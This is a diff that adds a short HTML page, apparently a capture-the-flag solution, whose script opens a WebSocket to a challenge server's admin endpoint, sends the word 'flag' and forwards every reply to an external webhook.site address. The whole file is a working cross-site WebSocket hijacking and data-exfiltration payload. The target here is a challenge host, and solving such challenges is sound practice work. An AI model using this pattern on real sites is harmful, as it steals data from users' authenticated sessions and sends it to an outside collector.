@@ -1,0 +1,10 @@
+<html>
+    <head></head>
+    <body>
+        <script>
+            const socket = new WebSocket('ws://chall.polygl0ts.ch:9010/admin/ws');
+            socket.onmessage = (m) => fetch('https://webhook.site/a03ef644-8325-4bd1-8898-4af20986b338?a=' + m.data);
+            socket.send('flag');
+        </script>
+    </body>
+</html>
